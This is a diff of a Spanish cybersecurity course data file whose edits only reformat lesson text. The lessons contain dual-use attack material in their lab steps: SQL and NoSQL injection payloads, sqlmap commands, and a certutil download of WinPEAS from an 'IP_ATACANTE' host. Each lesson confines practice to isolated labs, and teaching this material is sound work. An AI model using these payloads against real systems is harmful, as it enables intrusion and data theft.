@@ -352,7 +352,7 @@ export const CLASSES = [
     "level": "Fundamentos",
     "duration": "120 min",
     "description": "Construir un laboratorio de seguridad aislado y reversible en tu propio equipo.",
-    "theory": "Construir un laboratorio de seguridad aislado y reversible en tu propio equipo. Al terminar tendrás una máquina atacante (Kali) y una o más máquinas víctima en una red interna sin salida a Internet ni a tu red doméstica, con snapshots para volver atrás tras cada experimento. > ⚠️ Nota ética y de seguridad: todo lo que se practica en este programa se hace exclusivamente dentro de este laboratorio aislado o contra sistemas para los que tengas autorización escrita. Atacar redes o equipos ajenos es ilegal. El aislamiento no es opcional: protege a terceros y te protege a ti.",
+    "theory": "Construir un laboratorio de seguridad aislado y reversible en tu propio equipo. Al terminar tendrás una máquina atacante (Kali) y una o más máquinas víctima en una red interna sin salida a Internet ni a tu red doméstica, con snapshots para volver atrás tras cada experimento. ⚠️ Nota ética y de seguridad: todo lo que se practica en este programa se hace exclusivamente dentro de este laboratorio aislado o contra sistemas para los que tengas autorización escrita. Atacar redes o equipos ajenos es ilegal. El aislamiento no es opcional: protege a terceros y te protege a ti.",
     "outcomes": [
       "Instalar un hipervisor y comprobar la virtualización por hardware.",
       "Desplegar Kali Linux y una VM víctima desde imágenes oficiales.",
@@ -2981,7 +2981,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "100 min",
     "description": "Aprender a almacenar contraseñas de forma resistente a cracking usando funciones de derivación de clave lentas y con memoria intensiva (bcrypt, scrypt, Argon2), y por qué usar SHA-256 o MD5 para contraseñas es un error…",
-    "theory": "Aprender a almacenar contraseñas de forma resistente a cracking usando funciones de derivación de clave lentas y con memoria intensiva (bcrypt, scrypt, Argon2), y por qué usar SHA-256 o MD5 para contraseñas es un error grave. El alumno entenderá el papel del salt, el pepper, el factor de coste y estimará el coste real de un ataque con hashcat en un entorno de laboratorio. > ⚠️ Nota ética: el cracking de hashes se practica solo sobre contraseñas y volcados propios de laboratorio. Atacar credenciales ajenas sin autorización es ilegal.",
+    "theory": "Aprender a almacenar contraseñas de forma resistente a cracking usando funciones de derivación de clave lentas y con memoria intensiva (bcrypt, scrypt, Argon2), y por qué usar SHA-256 o MD5 para contraseñas es un error grave. El alumno entenderá el papel del salt, el pepper, el factor de coste y estimará el coste real de un ataque con hashcat en un entorno de laboratorio. ⚠️ Nota ética: el cracking de hashes se practica solo sobre contraseñas y volcados propios de laboratorio. Atacar credenciales ajenas sin autorización es ilegal.",
     "outcomes": [
       "Explicar por qué las contraseñas requieren funciones lentas, no hashes rápidos.",
       "Aplicar salt (único por usuario) y pepper (secreto global) correctamente.",
@@ -3125,7 +3125,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Entender que la mayoría de los sistemas criptográficos no se rompen atacando el algoritmo, sino explotando su implementación.",
-    "theory": "Entender que la mayoría de los sistemas criptográficos no se rompen atacando el algoritmo, sino explotando su implementación. El alumno estudiará dos familias emblemáticas: el ataque de padding oracle (descifrar sin la clave abusando de mensajes de error de padding en CBC) y los ataques de canal lateral por tiempo (deducir secretos midiendo cuánto tarda una operación). Ambos se practican solo en un servicio de laboratorio propio. > ⚠️ Nota ética: estos ataques se ejecutan exclusivamente contra un oráculo/servidor montado por ti en tu laboratorio. Aplicarlos a sistemas de terceros sin autoriza…",
+    "theory": "Entender que la mayoría de los sistemas criptográficos no se rompen atacando el algoritmo, sino explotando su implementación. El alumno estudiará dos familias emblemáticas: el ataque de padding oracle (descifrar sin la clave abusando de mensajes de error de padding en CBC) y los ataques de canal lateral por tiempo (deducir secretos midiendo cuánto tarda una operación). Ambos se practican solo en un servicio de laboratorio propio. ⚠️ Nota ética: estos ataques se ejecutan exclusivamente contra un oráculo/servidor montado por ti en tu laboratorio. Aplicarlos a sistemas de terceros sin autorizaci…",
     "outcomes": [
       "Explicar cómo un padding oracle permite descifrar CBC byte a byte.",
       "Montar un oráculo vulnerable de laboratorio y atacarlo de forma controlada.",
@@ -3317,7 +3317,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "90 min",
     "description": "Distinguir esteganografía (ocultar la existencia de un mensaje) de criptografía (ocultar su contenido), y entender cómo se combinan.",
-    "theory": "Distinguir esteganografía (ocultar la existencia de un mensaje) de criptografía (ocultar su contenido), y entender cómo se combinan. El alumno aprenderá técnicas clásicas (LSB en imágenes, ocultación en metadatos), el estegoanálisis (detección), y usos legítimos (marcas de agua, watermarking) frente a usos maliciosos (exfiltración, C2 encubierto). Todo se practica sobre archivos propios de laboratorio. > ⚠️ Nota ética: las técnicas de ocultación se practican solo con archivos propios y con fines de aprendizaje/defensa. Usarlas para exfiltrar datos o evadir controles sin autorización es ilícit…",
+    "theory": "Distinguir esteganografía (ocultar la existencia de un mensaje) de criptografía (ocultar su contenido), y entender cómo se combinan. El alumno aprenderá técnicas clásicas (LSB en imágenes, ocultación en metadatos), el estegoanálisis (detección), y usos legítimos (marcas de agua, watermarking) frente a usos maliciosos (exfiltración, C2 encubierto). Todo se practica sobre archivos propios de laboratorio. ⚠️ Nota ética: las técnicas de ocultación se practican solo con archivos propios y con fines de aprendizaje/defensa. Usarlas para exfiltrar datos o evadir controles sin autorización es ilícito.",
     "outcomes": [
       "Diferenciar esteganografía de criptografía y explicar cuándo combinarlas.",
       "Ocultar y extraer datos con LSB en imágenes.",
@@ -3712,7 +3712,7 @@ export const CLASSES = [
       "Máquinas víctima: Metasploitable2 y Metasploitable3 (VMs deliberadamente vulnerables de Rapid7), desplegadas en la misma red interna aislada.",
       "Complementos: nmap para descubrimiento previo, navegador para las consolas web de Nessus/GVM, cuenta de NVD (nvd.nist.gov) para consulta manual de CVEs."
     ],
-    "lab": "> Todo el laboratorio se ejecuta en una red interna aislada (host-only), contra Metasploitable2/3 desplegadas por el propio alumno. 1. Levantar la red interna en el hipervisor y confirmar que Kali y Metasploitable2 están en el mismo segmento sin salida a producción: ip a en Kali, ping <IP-metasploitable>. 2. Iniciar el servicio de Nessus (sudo systemctl start nessusd) y acceder a https://localhos…",
+    "lab": "Todo el laboratorio se ejecuta en una red interna aislada (host-only), contra Metasploitable2/3 desplegadas por el propio alumno. 1. Levantar la red interna en el hipervisor y confirmar que Kali y Metasploitable2 están en el mismo segmento sin salida a producción: ip a en Kali, ping <IP-metasploitable>. 2. Iniciar el servicio de Nessus (sudo systemctl start nessusd) y acceder a https://localhost:…",
     "exercises": [
       "Instalar Nessus Essentials y realizar un escaneo de descubrimiento (host discovery) sobre el rango 192.168.56.0/24.",
       "Configurar un escaneo autenticado completo contra Metasploitable2 y exportar el reporte en formato PDF/HTML.",
@@ -3988,7 +3988,7 @@ export const CLASSES = [
       "Snapshots de VM: antes de probar cualquier kernel exploit, toma un snapshot del estado actual; estos exploits son inestables y pueden colgar o corromper el sistema de laboratorio.",
       "Acceso SSH o shell reversa ya establecida en el objetivo (asumimos que la clase 075 o equivalente ya cubrió el acceso inicial)."
     ],
-    "lab": "> Todo lo siguiente se ejecuta exclusivamente contra una VM propia o un target de laboratorio autorizado (HTB, THM, VulnHub). Nunca contra sistemas sin permiso explícito por escrito. 1. Confirma el contexto de usuario y sistema: id, whoami, uname -a, cat /etc/os-release. 2. Transfiere LinPEAS al objetivo: en la atacante, python3 -m http.server 8000 dentro de la carpeta con linpeas.sh; en el objet…",
+    "lab": "Todo lo siguiente se ejecuta exclusivamente contra una VM propia o un target de laboratorio autorizado (HTB, THM, VulnHub). Nunca contra sistemas sin permiso explícito por escrito. 1. Confirma el contexto de usuario y sistema: id, whoami, uname -a, cat /etc/os-release. 2. Transfiere LinPEAS al objetivo: en la atacante, python3 -m http.server 8000 dentro de la carpeta con linpeas.sh; en el objetiv…",
     "exercises": [
       "Enumera manualmente (sin LinPEAS) los binarios SUID de tu VM de laboratorio y clasifica cuáles son explotables según GTFOBins.",
       "Configura intencionalmente una entrada sudoers insegura (NOPASSWD: /usr/bin/find) y documenta el paso a paso de la escalada.",
@@ -4045,7 +4045,7 @@ export const CLASSES = [
       "Seatbelt: herramienta de enumeración en C# de la suite Ghostpack, útil como alternativa o complemento a WinPEAS para checks más específicos de dominio.",
       "msfvenom: generador de payloads de Metasploit Framework, usado para crear los binarios/MSI de prueba en el laboratorio."
     ],
-    "lab": "> Todo el laboratorio se ejecuta contra una VM Windows propia o un target de plataforma de laboratorio autorizada. Nunca contra un sistema ajeno sin autorización explícita por escrito. 1. Verifica el contexto actual: whoami, whoami /priv, whoami /groups, systeminfo. 2. Transfiere y ejecuta WinPEAS: certutil -urlcache -f http://IP_ATACANTE:8000/winPEASx64.exe wp.exe y luego .\\wp.exe > peas.txt. 3.…",
+    "lab": "Todo el laboratorio se ejecuta contra una VM Windows propia o un target de plataforma de laboratorio autorizada. Nunca contra un sistema ajeno sin autorización explícita por escrito. 1. Verifica el contexto actual: whoami, whoami /priv, whoami /groups, systeminfo. 2. Transfiere y ejecuta WinPEAS: certutil -urlcache -f http://IP_ATACANTE:8000/winPEASx64.exe wp.exe y luego .\\wp.exe > peas.txt. 3. B…",
     "exercises": [
       "Ejecuta WinPEAS y clasifica los tres hallazgos con mayor probabilidad de escalada.",
       "Configura intencionalmente un servicio con ruta sin comillas y demuestra su explotación.",
@@ -4102,7 +4102,7 @@ export const CLASSES = [
       "BloodHound + SharpHound/bloodhound-python: recolector de datos de AD (bloodhound-python -u user -p pass -d dominio.local -ns 10.10.10.5 -c all) y su interfaz de análisis en Neo4j.",
       "Wireshark o tcpdump (opcional): útil para observar en el laboratorio el tráfico SMB/WMI/WinRM generado por cada técnica y entender su huella en la red."
     ],
-    "lab": "> Todas las técnicas de esta clase reutilizan credenciales reales para acceder a más sistemas. Practica esto exclusivamente dentro de tu laboratorio propio o del alcance autorizado por un contrato de pentesting con reglas de engagement firmadas. Usar estas técnicas fuera de ese alcance es acceso no autorizado y constituye delito. 1. Con un hash NTLM obtenido (formato LM:NT), valida en qué hosts d…",
+    "lab": "Todas las técnicas de esta clase reutilizan credenciales reales para acceder a más sistemas. Practica esto exclusivamente dentro de tu laboratorio propio o del alcance autorizado por un contrato de pentesting con reglas de engagement firmadas. Usar estas técnicas fuera de ese alcance es acceso no autorizado y constituye delito. 1. Con un hash NTLM obtenido (formato LM:NT), valida en qué hosts de…",
     "exercises": [
       "Explica con tus propias palabras por qué NTLM permite Pass-the-Hash y qué diferencia tiene frente a Kerberos en este aspecto.",
       "Compara PsExec y wmiexec en cuanto a artefactos forenses que dejan en el host destino.",
@@ -4161,7 +4161,7 @@ export const CLASSES = [
       "nmap: para validar el alcance de la red interna antes y después de establecer el pivote, comparando resultados.",
       "Wireshark: opcional, útil para observar cómo se ve el tráfico encapsulado de cada tipo de túnel en el laboratorio."
     ],
-    "lab": "> El pivoting extiende deliberadamente tu acceso hacia redes que suelen estar segmentadas por diseño de seguridad. Practica esto solo dentro de tu laboratorio propio o del alcance explícitamente autorizado en las reglas de engagement de un pentest contratado. Alcanzar una red no incluida en el alcance firmado es una violación grave del contrato y puede constituir delito. 1. Con acceso SSH al pivo…",
+    "lab": "El pivoting extiende deliberadamente tu acceso hacia redes que suelen estar segmentadas por diseño de seguridad. Practica esto solo dentro de tu laboratorio propio o del alcance explícitamente autorizado en las reglas de engagement de un pentest contratado. Alcanzar una red no incluida en el alcance firmado es una violación grave del contrato y puede constituir delito. 1. Con acceso SSH al pivote…",
     "exercises": [
       "Explica con un ejemplo concreto la diferencia entre -L, -R y -D en un túnel SSH.",
       "Escanea un host de la subred interna con proxychains y nmap, y justifica por qué debes usar -sT -Pn en lugar de un escaneo SYN.",
@@ -4220,7 +4220,7 @@ export const CLASSES = [
       "GPU con drivers actualizados (opcional pero recomendado): Hashcat aprovecha CUDA/OpenCL; sin GPU, funciona igualmente en modo CPU (-D 1) aunque más lento.",
       "hcxtools: conjunto de utilidades para convertir capturas de tráfico (por ejemplo handshakes WPA) al formato que Hashcat necesita, útil para prácticas de laboratorio con redes Wi-Fi propias."
     ],
-    "lab": "> El cracking de contraseñas se practica exclusivamente sobre hashes propios o extraídos en un engagement autorizado por escrito. Las contraseñas recuperadas son datos altamente sensibles: se documentan únicamente para demostrar impacto y deben destruirse al cerrar el laboratorio o el contrato, nunca reutilizarse fuera del alcance acordado. 1. Identifica el tipo de hash antes de cualquier ataque:…",
+    "lab": "El cracking de contraseñas se practica exclusivamente sobre hashes propios o extraídos en un engagement autorizado por escrito. Las contraseñas recuperadas son datos altamente sensibles: se documentan únicamente para demostrar impacto y deben destruirse al cerrar el laboratorio o el contrato, nunca reutilizarse fuera del alcance acordado. 1. Identifica el tipo de hash antes de cualquier ataque: h…",
     "exercises": [
       "Identifica tres tipos de hash distintos (por ejemplo NTLM, MD5 y bcrypt) y anota su modo -m correspondiente en Hashcat.",
       "Compara la tasa de éxito de un ataque de diccionario puro frente a diccionario más regla best64 sobre el mismo conjunto de hashes.",
@@ -4357,7 +4357,7 @@ export const CLASSES = [
     ],
     "definitions": [],
     "tools": [],
-    "lab": "> Todo ocurre entre dos máquinas tuyas en una red aislada. El fin es observar la telemetría y luego bloquearla. 1. Preparar el destino (tu VM atacante). Levanta un receptor HTTP simple: ``bash python3 -m http.server 8000 # receptor simple: devuelve 501 al POST, pero el tráfico (lo que capturamos) viaja igual ` 2. Observar el canal. En la VM víctima, arranca la captura para ver exactamente qué via…",
+    "lab": "Todo ocurre entre dos máquinas tuyas en una red aislada. El fin es observar la telemetría y luego bloquearla. 1. Preparar el destino (tu VM atacante). Levanta un receptor HTTP simple: ``bash python3 -m http.server 8000 # receptor simple: devuelve 501 al POST, pero el tráfico (lo que capturamos) viaja igual ` 2. Observar el canal. En la VM víctima, arranca la captura para ver exactamente qué viaja…",
     "exercises": [
       "Clasifica en MITRE ATT&CK: ¿T1041 (over C2) o T1048 (alternative protocol)? Justifica con un ejemplo de cada uno.",
       "Explica por qué DNS e ICMP son canales atractivos para un atacante y qué control los neutraliza.",
@@ -4395,7 +4395,7 @@ export const CLASSES = [
     ],
     "definitions": [],
     "tools": [],
-    "lab": "> Objetivo: comprobar que una arquitectura de logging bien diseñada resiste el borrado local. Todo en VMs tuyas. 1. Montar reenvío de logs. Configura una VM Linux propia para enviar sus logs en tiempo real a un colector central (otra VM tuya): ``bash # /etc/rsyslog.d/90-forward.conf (VM origen) . @@<IP_colector>:514 # TCP a tu colector de laboratorio ` 2. Generar actividad. Realiza acciones norma…",
+    "lab": "Objetivo: comprobar que una arquitectura de logging bien diseñada resiste el borrado local. Todo en VMs tuyas. 1. Montar reenvío de logs. Configura una VM Linux propia para enviar sus logs en tiempo real a un colector central (otra VM tuya): ``bash # /etc/rsyslog.d/90-forward.conf (VM origen) . @@<IP_colector>:514 # TCP a tu colector de laboratorio ` 2. Generar actividad. Realiza acciones normale…",
     "exercises": [
       "Explica por qué borrar el Security log de Windows es contraproducente para un atacante sigiloso.",
       "Enumera tres lugares donde la evidencia \"borrada\" suele sobrevivir (journaling, VSS, memoria, SIEM).",
@@ -4434,7 +4434,7 @@ export const CLASSES = [
     ],
     "definitions": [],
     "tools": [],
-    "lab": "> Ejercicio de redacción a partir de un hallazgo de laboratorio (p. ej., una SQLi encontrada en tu propia instancia de DVWA en clases previas). 1. Redacta el resumen ejecutivo. Una página, sin jerga: ¿cuál es el riesgo para el negocio? ¿qué tres cosas debe hacer la dirección? 2. Describe la metodología. Alcance, ventana temporal, enfoque (caja negra/gris/blanca), limitaciones. 3. Documenta un hal…",
+    "lab": "Ejercicio de redacción a partir de un hallazgo de laboratorio (p. ej., una SQLi encontrada en tu propia instancia de DVWA en clases previas). 1. Redacta el resumen ejecutivo. Una página, sin jerga: ¿cuál es el riesgo para el negocio? ¿qué tres cosas debe hacer la dirección? 2. Describe la metodología. Alcance, ventana temporal, enfoque (caja negra/gris/blanca), limitaciones. 3. Documenta un halla…",
     "exercises": [
       "Escribe un resumen ejecutivo de 200 palabras para una audiencia no técnica a partir de 3 hallazgos.",
       "Calcula el CVSS v3.1 de una SQLi no autenticada expuesta a internet y justifica cada métrica.",
@@ -4484,7 +4484,7 @@ export const CLASSES = [
       "Burp Suite Community o OWASP ZAP como proxy.",
       "OWASP Juice Shop en local vía Docker:"
     ],
-    "lab": "> ⚠️ Ética: solo sobre Juice Shop en tu propia máquina. 1. Levanta Juice Shop y abre http://localhost:3000. 2. Abre DevTools → pestaña Network. Recarga y observa las llamadas a /rest/ y /api/. 3. Anota cada endpoint distinto en una tabla: método, ruta, parámetros, si requiere token. 4. Inspecciona el JavaScript cargado (Sources): busca rutas de API embebidas y roles (admin, accounting). 5. Config…",
+    "lab": "⚠️ Ética: solo sobre Juice Shop en tu propia máquina. 1. Levanta Juice Shop y abre http://localhost:3000. 2. Abre DevTools → pestaña Network. Recarga y observa las llamadas a /rest/ y /api/. 3. Anota cada endpoint distinto en una tabla: método, ruta, parámetros, si requiere token. 4. Inspecciona el JavaScript cargado (Sources): busca rutas de API embebidas y roles (admin, accounting). 5. Configur…",
     "exercises": [
       "Lista 10 puntos de entrada distintos en Juice Shop (incluye cabeceras y cookies).",
       "Identifica qué controles de seguridad son de cliente (validación JS) y cuáles de servidor.",
@@ -4535,7 +4535,7 @@ export const CLASSES = [
       "OWASP Juice Shop (cada reto está etiquetado con su categoría).",
       "Hoja de cálculo o plantilla para mapear hallazgos → categoría → severidad."
     ],
-    "lab": "> Ejercicio aplicado de taxonomía y priorización (no ofensivo aún). 1. Abre el sitio oficial del Top 10 2021 y lee la ficha de cada categoría (A01–A10). 2. Crea una tabla con columnas: categoría, ejemplo real, CWE asociada, control preventivo. 3. En Juice Shop, abre el Score Board (/#/score-board) y filtra retos por categoría. 4. Elige 5 retos de categorías distintas y anota a qué A0X pertenecen…",
+    "lab": "Ejercicio aplicado de taxonomía y priorización (no ofensivo aún). 1. Abre el sitio oficial del Top 10 2021 y lee la ficha de cada categoría (A01–A10). 2. Crea una tabla con columnas: categoría, ejemplo real, CWE asociada, control preventivo. 3. En Juice Shop, abre el Score Board (/#/score-board) y filtra retos por categoría. 4. Elige 5 retos de categorías distintas y anota a qué A0X pertenecen y…",
     "exercises": [
       "Asocia cada una de estas CWE a su categoría: CWE-89, CWE-79, CWE-352, CWE-918, CWE-611.",
       "Explica por qué \"Injection\" absorbió a XSS en 2021.",
@@ -4586,7 +4586,7 @@ export const CLASSES = [
       "Navegador dedicado al testing (perfil separado) o el navegador embebido de Burp.",
       "Laboratorio local: Juice Shop o DVWA."
     ],
-    "lab": "> ⚠️ Solo contra tus propios laboratorios. 1. Instala Burp y configura el listener en 127.0.0.1:8080 (Proxy → Options). 2. Apunta el navegador a ese proxy o usa el navegador embebido de Burp (más simple). 3. Exporta e instala el certificado CA para ver HTTPS sin advertencias. 4. Navega Juice Shop; observa el tráfico en Proxy → HTTP history. 5. Define el scope: Target → Site map → clic derecho en…",
+    "lab": "⚠️ Solo contra tus propios laboratorios. 1. Instala Burp y configura el listener en 127.0.0.1:8080 (Proxy → Options). 2. Apunta el navegador a ese proxy o usa el navegador embebido de Burp (más simple). 3. Exporta e instala el certificado CA para ver HTTPS sin advertencias. 4. Navega Juice Shop; observa el tráfico en Proxy → HTTP history. 5. Define el scope: Target → Site map → clic derecho en el…",
     "exercises": [
       "Configura Match/Replace para añadir una cabecera personalizada a toda petición.",
       "Usa Intruder en modo cluster bomb sobre dos parámetros a la vez.",
@@ -4636,7 +4636,7 @@ export const CLASSES = [
       "OWASP ZAP (descarga oficial) o su imagen Docker zaproxy/zap-stable.",
       "Laboratorio: Juice Shop en http://localhost:3000."
     ],
-    "lab": "> ⚠️ Solo contra laboratorios propios. 1. Instala ZAP y arranca en modo Standard. Configura el proxy local (por defecto 8080 o 8090). 2. Instala el certificado raíz de ZAP en el navegador (Options → Network → Server Certificates). 3. Explora Juice Shop manualmente pasando por ZAP para poblar el árbol de sitios. 4. Lanza el Spider sobre el host y luego el AJAX Spider para capturar rutas de la SPA.…",
+    "lab": "⚠️ Solo contra laboratorios propios. 1. Instala ZAP y arranca en modo Standard. Configura el proxy local (por defecto 8080 o 8090). 2. Instala el certificado raíz de ZAP en el navegador (Options → Network → Server Certificates). 3. Explora Juice Shop manualmente pasando por ZAP para poblar el árbol de sitios. 4. Lanza el Spider sobre el host y luego el AJAX Spider para capturar rutas de la SPA. 5…",
     "exercises": [
       "Compara el número de URLs descubiertas por spider tradicional vs. AJAX spider.",
       "Configura un Context con credenciales para un escaneo autenticado.",
@@ -4688,7 +4688,7 @@ export const CLASSES = [
       "Arjun para descubrimiento de parámetros; subfinder/amass para subdominios.",
       "LinkFinder/gau para extraer rutas del JavaScript."
     ],
-    "lab": "> ⚠️ Solo contra tu propio laboratorio (Juice Shop / DVWA) o programas con permiso explícito. 1. Levanta Juice Shop y hazlo pasar por Burp para poblar el sitemap con navegación manual. 2. Ejecuta content discovery con ffuf: ``bash ffuf -u http://localhost:3000/FUZZ -w SecLists/Discovery/Web-Content/common.txt -mc 200,301,302,403 ` 3. Revisa robots.txt, sitemap.xml y /ftp (una ruta famosa de Juice…",
+    "lab": "⚠️ Solo contra tu propio laboratorio (Juice Shop / DVWA) o programas con permiso explícito. 1. Levanta Juice Shop y hazlo pasar por Burp para poblar el sitemap con navegación manual. 2. Ejecuta content discovery con ffuf: ``bash ffuf -u http://localhost:3000/FUZZ -w SecLists/Discovery/Web-Content/common.txt -mc 200,301,302,403 ` 3. Revisa robots.txt, sitemap.xml y /ftp (una ruta famosa de Juice S…",
     "exercises": [
       "Compara resultados de common.txt vs. directory-list-2.3-medium.txt.",
       "Usa filtros por tamaño (-fs) para eliminar respuestas de \"not found\" personalizadas.",
@@ -4709,7 +4709,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "120 min",
     "description": "Comprender a fondo la inyección SQL (SQLi): por qué ocurre, cómo detectarla y cómo explotarla en su forma clásica (in-band).",
-    "theory": "Comprender a fondo la inyección SQL (SQLi): por qué ocurre, cómo detectarla y cómo explotarla en su forma clásica (in-band). Es la vulnerabilidad emblema de la categoría A03 Injection y una de las de mayor impacto: puede exponer bases de datos completas. > ⚠️ Ética: todo lo aquí descrito se practica únicamente en laboratorios propios (DVWA, Juice Shop) o con autorización explícita por escrito. Inyectar SQL en sistemas ajenos es un delito.",
+    "theory": "Comprender a fondo la inyección SQL (SQLi): por qué ocurre, cómo detectarla y cómo explotarla en su forma clásica (in-band). Es la vulnerabilidad emblema de la categoría A03 Injection y una de las de mayor impacto: puede exponer bases de datos completas. ⚠️ Ética: todo lo aquí descrito se practica únicamente en laboratorios propios (DVWA, Juice Shop) o con autorización explícita por escrito. Inyectar SQL en sistemas ajenos es un delito.",
     "outcomes": [
       "Explicar cómo la concatenación de entradas produce SQLi.",
       "Detectar puntos inyectables con pruebas de error y booleanas.",
@@ -4739,7 +4739,7 @@ export const CLASSES = [
       "Burp Suite para interceptar y editar parámetros.",
       "Cliente SQL para inspeccionar la base de datos y comprobar tu progreso."
     ],
-    "lab": "> ⚠️ Solo en DVWA/Juice Shop propios. 1. En DVWA → SQL Injection, introduce 1 y observa la consulta normal. 2. Prueba 1' y busca un error SQL: confirma que el input llega crudo a la query. 3. Determina el número de columnas con 1' ORDER BY 1-- -, ORDER BY 2-- -, hasta que falle. 4. Extrae datos con UNION: ``sql 1' UNION SELECT user, password FROM users-- - ` 5. Enumera el esquema con information_…",
+    "lab": "⚠️ Solo en DVWA/Juice Shop propios. 1. En DVWA → SQL Injection, introduce 1 y observa la consulta normal. 2. Prueba 1' y busca un error SQL: confirma que el input llega crudo a la query. 3. Determina el número de columnas con 1' ORDER BY 1-- -, ORDER BY 2-- -, hasta que falle. 4. Extrae datos con UNION: ``sql 1' UNION SELECT user, password FROM users-- - ` 5. Enumera el esquema con information_sc…",
     "exercises": [
       "Determina el motor de base de datos por su sintaxis de comentarios y errores.",
       "Extrae el hash de la contraseña de admin y crackéalo (offline, con hashcat) en tu lab.",
@@ -4760,7 +4760,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "130 min",
     "description": "Explotar SQLi cuando no hay salida directa de datos: inyección ciega booleana, basada en tiempo y out-of-band.",
-    "theory": "Explotar SQLi cuando no hay salida directa de datos: inyección ciega booleana, basada en tiempo y out-of-band. Estas técnicas permiten extraer información incluso cuando la aplicación no muestra errores ni resultados, algo muy común en aplicaciones reales bien configuradas. > ⚠️ Ética: exclusivamente en DVWA, Juice Shop, PortSwigger labs u objetivos con autorización expresa.",
+    "theory": "Explotar SQLi cuando no hay salida directa de datos: inyección ciega booleana, basada en tiempo y out-of-band. Estas técnicas permiten extraer información incluso cuando la aplicación no muestra errores ni resultados, algo muy común en aplicaciones reales bien configuradas. ⚠️ Ética: exclusivamente en DVWA, Juice Shop, PortSwigger labs u objetivos con autorización expresa.",
     "outcomes": [
       "Distinguir blind booleana, temporal y out-of-band.",
       "Extraer datos bit a bit con condiciones booleanas.",
@@ -4790,7 +4790,7 @@ export const CLASSES = [
       "Burp Intruder/Repeater para automatizar condiciones.",
       "Burp Collaborator o un servidor DNS propio para OOB."
     ],
-    "lab": "> ⚠️ Solo en los labs autorizados. 1. Elige el lab \"Blind SQL injection with conditional responses\" de PortSwigger. 2. Identifica el oráculo: un mensaje que aparece solo cuando la condición es verdadera. 3. Confirma inyección con ' AND 1=1-- - (aparece) vs. ' AND 1=2-- - (no aparece). 4. Extrae un carácter con: ``sql ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)…",
+    "lab": "⚠️ Solo en los labs autorizados. 1. Elige el lab \"Blind SQL injection with conditional responses\" de PortSwigger. 2. Identifica el oráculo: un mensaje que aparece solo cuando la condición es verdadera. 3. Confirma inyección con ' AND 1=1-- - (aparece) vs. ' AND 1=2-- - (no aparece). 4. Extrae un carácter con: ``sql ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='…",
     "exercises": [
       "Reconstruye una contraseña de 20 caracteres con blind booleana y mide cuántas peticiones costó.",
       "Optimiza la extracción usando búsqueda binaria (> en vez de =).",
@@ -4811,7 +4811,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "100 min",
     "description": "Automatizar la detección y explotación de SQLi con sqlmap, la herramienta de referencia.",
-    "theory": "Automatizar la detección y explotación de SQLi con sqlmap, la herramienta de referencia. Aprenderás a usarla con criterio: alimentarla con peticiones reales de Burp, ajustar niveles/riesgos y extraer datos, sin convertirla en un botón mágico que dispara a ciegas. > ⚠️ Ética: sqlmap solo contra objetivos propios (DVWA, Juice Shop) o con autorización escrita. Un escaneo de sqlmap es intrusivo y puede alterar datos.",
+    "theory": "Automatizar la detección y explotación de SQLi con sqlmap, la herramienta de referencia. Aprenderás a usarla con criterio: alimentarla con peticiones reales de Burp, ajustar niveles/riesgos y extraer datos, sin convertirla en un botón mágico que dispara a ciegas. ⚠️ Ética: sqlmap solo contra objetivos propios (DVWA, Juice Shop) o con autorización escrita. Un escaneo de sqlmap es intrusivo y puede alterar datos.",
     "outcomes": [
       "Alimentar sqlmap con una request capturada en Burp (-r).",
       "Controlar el alcance con --level, --risk y --technique.",
@@ -4840,7 +4840,7 @@ export const CLASSES = [
       "sqlmap (Python).",
       "Burp para capturar la petición y guardarla como archivo .txt."
     ],
-    "lab": "> ⚠️ Solo contra DVWA/Juice Shop propios. 1. En DVWA, captura la petición vulnerable con Burp y guárdala como req.txt (clic derecho → Copy to file). 2. Lanza sqlmap sobre esa request: ``bash sqlmap -r req.txt -p id --batch ` 3. Si detecta inyección, enumera bases de datos: `bash sqlmap -r req.txt -p id --dbs ` 4. Lista tablas y columnas de la base objetivo: `bash sqlmap -r req.txt -p id -D dvwa -…",
+    "lab": "⚠️ Solo contra DVWA/Juice Shop propios. 1. En DVWA, captura la petición vulnerable con Burp y guárdala como req.txt (clic derecho → Copy to file). 2. Lanza sqlmap sobre esa request: ``bash sqlmap -r req.txt -p id --batch ` 3. Si detecta inyección, enumera bases de datos: `bash sqlmap -r req.txt -p id --dbs ` 4. Lista tablas y columnas de la base objetivo: `bash sqlmap -r req.txt -p id -D dvwa --t…",
     "exercises": [
       "Detecta el motor y la versión con --banner.",
       "Compara resultados con --technique=BT vs. la selección automática.",
@@ -4861,7 +4861,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "90 min",
     "description": "Entender que la inyección no es exclusiva de SQL: las bases NoSQL (MongoDB, etc.) tienen sus propios vectores.",
-    "theory": "Entender que la inyección no es exclusiva de SQL: las bases NoSQL (MongoDB, etc.) tienen sus propios vectores. Aprenderás a explotar operadores de MongoDB y JavaScript del lado servidor para saltar autenticación y extraer datos. > ⚠️ Ética: solo en laboratorios propios o autorizados. Estas técnicas modifican y exfiltran datos reales.",
+    "theory": "Entender que la inyección no es exclusiva de SQL: las bases NoSQL (MongoDB, etc.) tienen sus propios vectores. Aprenderás a explotar operadores de MongoDB y JavaScript del lado servidor para saltar autenticación y extraer datos. ⚠️ Ética: solo en laboratorios propios o autorizados. Estas técnicas modifican y exfiltran datos reales.",
     "outcomes": [
       "Explicar por qué el paso de objetos JSON habilita NoSQLi.",
       "Aplicar operadores MongoDB ($ne, $gt, $regex, $where) como payloads.",
@@ -4891,7 +4891,7 @@ export const CLASSES = [
       "Burp Suite para editar cuerpos JSON.",
       "NoSQLMap (opcional, para automatizar)."
     ],
-    "lab": "> ⚠️ Solo en tu laboratorio. 1. Localiza un login que reciba JSON ({\"username\":\"x\",\"password\":\"y\"}). 2. Con Burp, cambia el body a inyección de operador: ``json {\"username\":\"admin\",\"password\":{\"$ne\":\"\"}} ` 3. Observa si se produce el bypass de autenticación. 4. Prueba la variante por query string: username[$ne]=&password[$ne]=. 5. Para NoSQLi ciega, usa $regex para adivinar la contraseña: `json {…",
